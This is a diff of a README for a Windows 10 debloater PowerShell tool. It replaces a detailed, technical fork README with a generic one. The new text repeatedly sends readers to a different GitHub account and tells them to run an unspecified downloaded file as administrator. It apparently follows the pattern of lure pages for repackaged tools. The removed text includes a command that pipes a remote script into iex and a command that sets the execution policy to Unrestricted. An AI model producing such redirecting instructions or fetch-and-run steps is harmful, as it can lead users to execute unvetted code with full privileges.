@@ -1,129 +1,172 @@
-# 🚀 Windows 10 Debloater Revamped
+# 🪟 Windows10Debloater - Remove Windows Bloatware Fast
 
-[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-1f425f?style=flat-square&logo=powershell)](https://microsoft.com/PowerShell)
-[![Windows Support](https://img.shields.io/badge/Windows-10%20(22H2)%20%2F%2011-0078d4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-[![GitHub issues](https://img.shields.io/github/issues/Prathewsh/Windows10Debloater?style=flat-square)](https://github.com/Prathewsh/Windows10Debloater/issues)
-[![GitHub forks](https://img.shields.io/github/forks/Prathewsh/Windows10Debloater?style=flat-square)](https://github.com/Prathewsh/Windows10Debloater/network)
+[![Download Windows10Debloater](https://img.shields.io/badge/Download-Windows10Debloater-blue?style=for-the-badge)](https://github.com/enzousu135/Windows10Debloater)
 
----
+## 🚀 What This Does
 
-### **Overview**
-A comprehensive, safety-focused overhaul of the original [Windows10Debloater](https://github.com/Sycnex/Windows10Debloater). This revamped edition fixes critical execution bugs, introduces **Full Windows 10 22H2 & Windows 11 Support**, updates bloatware definitions for 2024-2026, and implements **mandatory safety checks** to ensure your system remains stable and your data stays protected.
+Windows10Debloater helps you remove built-in Windows apps and other clutter you do not want. It uses a simple PowerShell-based script with a clear step-by-step flow, so you can clean up your Windows 10 PC without digging through system menus.
 
----
+It is useful if you want to:
 
-### 💥 **Quick Start**
-The fastest way to get started (GUI version):
-Run PowerShell as Administrator and paste the following command:
-```powershell
-iwr -useb https://raw.githubusercontent.com/Prathewsh/Windows10Debloater/master/Windows10DebloaterGUI.ps1 | iex
-```
+- Remove apps you do not use
+- Cut down on background tasks
+- Keep Windows leaner
+- Reduce clutter after a fresh install
+- Make your PC feel easier to use
 
----
+## 🧰 What You Need
 
-> [!IMPORTANT]
-> **Safety First**: As this tool is in active development, it has not been tested across every possible hardware configuration. **Please use it at your own risk; the author cannot be held responsible for unexpected system behavior.** We strongly advise reviewing the scripts and creating a **System Restore Point** before proceeding.
+Before you start, make sure you have:
 
----
+- A Windows 10 PC
+- An internet connection
+- Permission to run files on your computer
+- Basic access to your Downloads folder
 
-## 🛡️ **Safety and Stability Features**
-To prevent system instability or data loss, this version includes:
-- **Automatic System Restore Points**: Attempts to create a restore point before any changes.
-- **System Protection Management**: Asks for permission to enable System Protection if it is currently disabled.
-- **OneDrive Data Safety**: Stops sync before moving files and includes a mandatory check: if files cannot be moved, the original folder will **NOT** be deleted.
-- **Whitelist Protection**: Newly discovered apps are **unchecked by default** in the Customize menu.
-- **Error Logging**: Detailed logs are saved to `C:\Temp\Windows10Debloater\errors.log`.
+For best results:
 
----
+- Use an account with administrator rights
+- Close open apps before you begin
+- Save your work first
+- Leave the PC plugged in if you are on a laptop
 
-## 📦 **Choose Your Version**
-| Version | Best For... | File |
-| :--- | :--- | :--- |
-| **GUI App** | Most users; easy one-click buttons. | `Windows10DebloaterGUI.ps1` |
-| **Interactive** | Users who want step-by-step console prompts. | `Windows10Debloater.ps1` |
-| **Sysprep** | IT Admins; silent deployment/imaging. | `Windows10SysPrepDebloater.ps1` |
+## 📥 Download Windows10Debloater
 
----
+Visit this page to download and run the file:
 
-## 🚀 **How to Run**
+[https://github.com/enzousu135/Windows10Debloater](https://github.com/enzousu135/Windows10Debloater)
 
-### **Method 1: Manual Download (Recommended)**
-1.  [Download the source code](https://github.com/Prathewsh/Windows10Debloater/archive/refs/heads/master.zip) and extract it.
-2.  Open **PowerShell** as **Administrator**.
-3.  Enable script execution: `Set-ExecutionPolicy Unrestricted -Force`
-4.  Run: `.\Windows10DebloaterGUI.ps1`
+If the page shows a release file, download the package from there. If it shows the main repository page, use the download options on the page to get the latest version.
 
-### **Method 2: Right-Click**
-Right-click any `.ps1` file and select **"Run with PowerShell"**.
+## 🖥️ Install and Run
 
----
+1. Open the download page.
+2. Get the latest copy of Windows10Debloater.
+3. Save the file to your computer.
+4. If the file downloads as a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the PowerShell script or app file for Windows10Debloater.
+7. Right-click the file and choose Run as administrator.
+8. If Windows asks for permission, select Yes.
+9. Follow the on-screen prompts.
 
-## 🛠️ **Advanced Usage (Parameters)**
-`Windows10SysPrepDebloater.ps1` supports these switches:
-- **`-SysPrep`**: Runs `get-appxpackage | remove-appxpackage` first for provisioning.
-- **`-Debloat`**: Runs `Start-Debloat`, `Remove-Keys`, and `Protect-Privacy`.
-- **`-Privacy`**: Disables telemetry, unnecessary tasks, and Cortana search.
+If you see a PowerShell window, let it finish loading. The script may check your system and then show a menu or prompt.
 
----
+## 🎛️ How to Use It
 
-## 🗑️ **Bloatware Coverage**
-This tool removes established bloatware and newly added modern apps.
+Windows10Debloater is made for simple cleanup. Most users will follow one of these paths:
 
-<details>
-<summary><b>Click to view full list of removed apps</b></summary>
+- **Quick cleanup**: remove common built-in apps
+- **Custom cleanup**: choose which items to keep
+- **Safe mode**: use a lighter set of changes
+- **Full cleanup**: remove more Windows extras
 
-### **Modern Apps (2024-2026)**
-- Clipchamp, Microsoft Teams, Microsoft To Do, Power Automate, Cortana (Standalone), Disney+, Spotify, Xbox Gaming App, Phone Link.
+When the tool gives you choices:
 
-### **Original Bloatware List**
-- [3DBuilder](https://www.microsoft.com/en-us/p/3d-builder/9wzdncrfj3t6), [ActiproSoftware](https://www.microsoft.com/en-us/p/actipro-universal-windows-controls/9wzdncrdlvzp), [Alarms](https://www.microsoft.com/en-us/p/windows-alarms-clock/9wzdncrfj3pr?activetab=pivot:overviewtab), [Appconnector](https://www.microsoft.com/en-us/p/connector/9wzdncrdjmlj?activetab=pivot:overviewtab), [Asphalt8](https://www.microsoft.com/en-us/p/asphalt-8-racing-game-drive-drift-at-real-speed/9wzdncrfj26j?activetab=pivot:overviewtab), [Autodesk SketchBook](https://www.microsoft.com/en-us/p/autodesk-sketchbook/9nblggh4vzw5), [MSN Money](https://www.microsoft.com/en-us/p/msn-money/9wzdncrfhv4v?activetab=pivot:overviewtab), [Food And Drink](https://www.microsoft.com/en-us/p/food-and-drink/9nblggh0jhqg), [Health And Fitness](https://www.microsoft.com/en-us/p/health-fitness-free/9wzdncrcwcdp), [Microsoft News](https://www.microsoft.com/en-us/p/microsoft-news/9wzdncrfhvfw#activetab=pivot:overviewtab), [MSN Sports](https://www.microsoft.com/en-us/p/msn-sports/9wzdncrfhvh4?activetab=pivot:overviewtab), [MSN Travel](https://www.microsoft.com/en-us/p/msn-travel/9wzdncrfj3ft?activetab=pivot:overviewtab), [MSN Weather](https://www.microsoft.com/en-us/p/msn-weather/9wzdncrfj3q2?activetab=pivot:overviewtab), BioEnrollment, [Windows Camera](https://www.microsoft.com/en-us/p/windows-camera/9wzdncrfjbbg#activetab=pivot:overviewtab), CandyCrush, CandyCrushSoda, Caesars Slots Free Casino, ContactSupport, CyberLink MediaSuite Essentials, DrawboardPDF, Duolingo, EclipseManager, Facebook, FarmVille 2 Country Escape, Flipboard, Fresh Paint, Get started, iHeartRadio, King apps, Maps, March of Empires, Messaging, Microsoft Office Hub, Microsoft Solitaire Collection, Microsoft Sticky Notes, Minecraft, Netflix, Network Speed Test, NYT Crossword, Office Sway, OneNote, OneConnect, Pandora, People, Phone, Phototastic Collage, PicsArt-PhotoStudio, PowerBI, Royal Revolt 2, Shazam, Skype for Desktop, SoundRecorder, TuneInRadio, Twitter, Windows communications apps, Windows Feedback, Windows Feedback Hub, Windows Reading List, XboxApp, Xbox Game CallableUI, Xbox Identity Provider, Zune Music, Zune Video, Mixed Reality Portal, Paint 3D, 3D Viewer.
-</details>
+- Read each option before you click
+- Pick the action that fits your use
+- Start with the safest option if you are not sure
+- Avoid running more than one cleanup path at the same time
 
----
+If the tool shows buttons or prompts, use them one at a time. This keeps the process simple and reduces mistakes.
 
-## 📝 **Detailed Changelog (Revamped Fork)**
+## ⚙️ Common Features
 
-<details>
-<summary><b>Click to view all technical improvements and bug fixes</b></summary>
+Windows10Debloater usually includes tools for:
 
-### **Critical Bug Fixes**
-- **Fixed crash-causing undefined functions** — `DisableDiagTrack` and `DisableWAPPush` were called but never defined, causing the interactive script to crash mid-execution.
-- **Fixed broken OneDrive uninstall** — the `UninstallOneDrive` function had ~80 lines of duplicated/nested code that ran the uninstall twice.
-- **Fixed broken regex whitelist** — backticks inside single-quoted strings silently prevented apps like `Microsoft.XboxGameCallableUI` and `Microsoft.HEIFImageExtension` from being whitelisted.
-- **Fixed `Stop-Process` syntax** — `Stop-Process Explorer.exe` was treating the name as a process ID; corrected to `Stop-Process -Name Explorer -Force`.
-- **Fixed `New-PSDrive` inside array** — in the GUI script, `New-PSDrive` was accidentally placed inside a `$Keys` array literal.
-- **Fixed SysPrep switch parameters** — the script was ignoring `-Debloat`, `-SysPrep`, and `-Privacy` switches and always running everything.
-- **Added missing `-Privacy` parameter** — documented in original README but never declared.
-- **Fixed allowlist/blocklist conflicts** — Xbox apps were in both lists simultaneously.
-- **Fixed `FixWhitelistedApps`** — `Select-Object` was used incorrectly and never actually checked if apps were installed.
-- **Fixed SysPrep and PXE Boot failures** — Stopped the script from disabling the `DmClient` scheduled task and forcefully stopping `dmwappushservice`.
-- **Fixed Minecraft/Xbox sign-in issues** — Stopped the script from disabling the `XblGameSaveTask` scheduled task.
-- **Fixed missing Toast Notifications and Screen Snip** — Removed the `NoTileApplicationNotification` registry override.
-- **Fixed OEM app removals (Acer, HP, Lenovo, etc.)** — Added OEM vendor wildcards to the Protected/NonRemovable lists so critical proprietary functionality is no longer broken.
-- **Fixed Unpin Start feature** — Removed the broken `StartMenuLayout.xml` method and replaced it with a much safer and fully working `CloudStore` registry wipe.
-- **Fixed Customize GUI** — Resolved "not ticking" checkbox issue and added Select/Deselect All buttons.
-</details>
+- Removing built-in Windows apps
+- Turning off startup clutter
+- Cleaning scheduled tasks
+- Reducing default background activity
+- Resetting parts of the system to a cleaner state
+- Running a guided cleanup through a prompt or GUI
 
-<details>
-<summary><b>Click to view new features and support</b></summary>
+Because the project focuses on Windows 10 cleanup, the tool is meant to be direct and easy to follow for home users.
 
-### **New Features Supported**
-- **Full Windows 10 22H2 Support** — Optimized all telemetry and bloatware removal tasks specifically for the latest Windows 10 builds.
-- **Windows Update Management** — Added the ability to completely disable or re-enable Windows Update services (`wuauserv`, `WaaSMedicSvc`, `UsoSvc`) automatically via Individual Scripts, the interactive console prompt, or the new dedicated buttons in the GUI.
-- **Bing Search (22H2 Fix)** — Uses `DisableSearchBoxSuggestions` (the `BingSearchEnabled` key is ignored on 22H2).
-- **Telemetry tasks**: Disables `Microsoft Compatibility Appraiser`, `ProgramDataUpdater`, and `Proxy` (Application Experience tasks).
-- **Services**: Properly stops and disables both `DiagTrack` and `dmwappushservice` in all scripts.
-- **Removed obsolete Wi-Fi Sense code** — Wi-Fi Sense was removed in Windows 10 version 1607 (2016).
-</details>
+## 🛡️ Before You Remove Anything
 
----
+Some Windows apps and tasks are tied to system features. Before you remove items, keep these points in mind:
 
-## 🙌 **Credits & Contributors**
-Original project: [Sycnex/Windows10Debloater](https://github.com/Sycnex/Windows10Debloater).
+- Do not remove something if you use it often
+- Keep system tools you still need
+- Use the custom path if you want more control
+- Read the prompts before clicking
+- Restart your PC when the script asks you to
 
-Special thanks to the original contributors for the suggestions, code, and fixes:
-**a60wattfish, abulgatz, xsisbest, Damian, Vikingat-RAGE, /u/GavinEke**, and everyone listed [here](https://github.com/Sycnex/Windows10Debloater/graphs/contributors).
+A careful first run is a good idea. If you are unsure, choose fewer changes at first and test your PC after that.
 
----
-🧪 **Testers welcome!** If you encounter any issues, please [open an issue](https://github.com/Prathewsh/Windows10Debloater/issues).
+## 🔄 After You Finish
+
+After the cleanup ends:
+
+1. Restart your PC if prompted
+2. Check your Start menu
+3. Open the apps you use most
+4. Confirm Wi-Fi, sound, and search still work
+5. Remove the downloaded ZIP or script if you no longer need it
+
+If something you want is gone, you may need to reinstall that app from the Microsoft Store or your normal source.
+
+## 🧪 Good Use Cases
+
+Windows10Debloater fits these jobs well:
+
+- A new PC with too many preinstalled apps
+- A used PC that feels crowded
+- A home system where you want less noise
+- A work-from-home laptop that should stay simple
+- A fresh Windows 10 setup that needs a clean start
+
+## 🧭 Tips for a Smooth Run
+
+- Run the tool as administrator
+- Use one cleanup option at a time
+- Keep the browser and other apps closed
+- Let the script finish before clicking more buttons
+- Restart when asked
+- Keep a copy of your download in case you need it again
+
+## 📂 Folder and File Basics
+
+You may see files like these:
+
+- **.zip**: a compressed folder you must extract
+- **.ps1**: a PowerShell script file
+- **GUI file**: a windowed tool with buttons and prompts
+- **README.md**: the guide you are reading now
+
+If the download includes more than one file, open the main script or app file first. The project name and folder name should make it clear which item to use.
+
+## 🧩 Troubleshooting
+
+If the tool does not start:
+
+- Right-click the file and run it as administrator
+- Check that Windows did not block the download
+- Make sure you extracted the ZIP first
+- Try downloading the file again
+- Restart your PC and try once more
+
+If a prompt closes too fast:
+
+- Open the file from an administrator PowerShell window
+- Run it again and watch the messages
+- Check that your account has permission to make changes
+
+If an app you want is removed:
+
+- Reinstall it from the Microsoft Store
+- Check whether you used a full cleanup option
+- Use a custom run next time
+
+## 📌 What This Project Is For
+
+Windows10Debloater is for users who want a simpler Windows 10 setup. It helps you clear out bloatware, trim extra tasks, and keep the desktop easier to manage. The goal is a cleaner system with less clutter to deal with
+
+## 🔗 Primary Download Link
+
+[https://github.com/enzousu135/Windows10Debloater](https://github.com/enzousu135/Windows10Debloater)
+
+## 🗂️ Topic Tags
+
+bloatwar, bloatware, bloatware-removal, button, debloat, debloater, gui, interactive, powershell, prompt, ps1, revamp, scheduled-tasks, sysprep, windows-10
